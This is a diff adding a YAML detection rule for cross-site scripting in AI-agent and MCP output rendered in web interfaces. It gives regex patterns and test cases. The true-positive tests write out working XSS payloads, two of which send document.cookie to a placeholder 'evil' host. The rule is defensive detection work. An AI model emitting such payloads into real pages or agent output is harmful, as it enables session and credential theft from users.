@@ -1,0 +1,79 @@
+title: Cross-site scripting (XSS) in agent / MCP rendered output
+id: ATR-2026-00571
+rule_version: 1
+status: experimental
+description: 'Agent/MCP output rendered in a web UI carries an XSS payload — an event handler that runs alert/eval/document.cookie, a javascript: scheme with a payload, or a <script> that exfiltrates cookies — enabling session/credential theft. Uses specific payload shapes (not bare <script>) to stay clean on benign HTML.'
+author: ATR Community
+date: 2026/06/02
+schema_version: '0.1'
+detection_tier: pattern
+maturity: experimental
+severity: high
+references:
+  cve:
+  - CVE-2025-62800
+  - CVE-2026-44429
+  - CVE-2026-27740
+  - CVE-2026-21866
+  cwe:
+  - CWE-79
+  external:
+  - https://github.com/jlowin/fastmcp/security/advisories
+metadata_provenance:
+  cve: human-authored
+  cwe: human-authored
+tags:
+  category: context-exfiltration
+  scan_target: runtime
+  confidence: high
+agent_source:
+  type: llm_io
+  framework:
+  - any
+  provider:
+  - any
+detection:
+  condition: any
+  false_positives: []
+  conditions:
+  - field: content
+    operator: regex
+    value: (?i)\bon(?:error|load|mouseover|click|focus|toggle)\s*=\s*[\"']?\s*(?:alert|eval|fetch|document\.(?:cookie|location|write)|window\.|location\s*=|String\.fromCharCode|atob)\b
+    description: HTML event handler executing alert/eval/document.cookie
+  - field: content
+    operator: regex
+    value: (?i)javascript:\s*(?:alert|eval|document\.|window\.|fetch|String\.fromCharCode|void)
+    description: 'javascript: scheme with an executable payload'
+  - field: content
+    operator: regex
+    value: (?i)<script[^>]*>[^<]{0,200}?(?:document\.cookie|fetch\(|eval\(|atob\(|new\s+Image\(\)\.src|\.src\s*=\s*[\"']?https?://)
+    description: <script> exfiltrating cookies / loading remote code
+response:
+  actions:
+  - alert
+  notify:
+  - security_team
+test_cases:
+  true_positives:
+  - input: <img src=x onerror=alert(document.cookie)>
+    expected: triggered
+    description: attack 1
+  - input: <a href="javascript:fetch('//evil/'+document.cookie)">
+    expected: triggered
+    description: attack 2
+  - input: <script>new Image().src='//evil/?c='+document.cookie</script>
+    expected: triggered
+    description: attack 3
+  true_negatives:
+  - input: <button onclick="handleSubmit()">Save</button>
+    expected: not_triggered
+    description: benign 1
+  - input: <script src="https://cdn.example.com/lib.js"></script>
+    expected: not_triggered
+    description: benign 2
+  - input: <a href="https://example.com">link</a>
+    expected: not_triggered
+    description: benign 3
+  - input: See the onload event in the docs
+    expected: not_triggered
+    description: benign 4
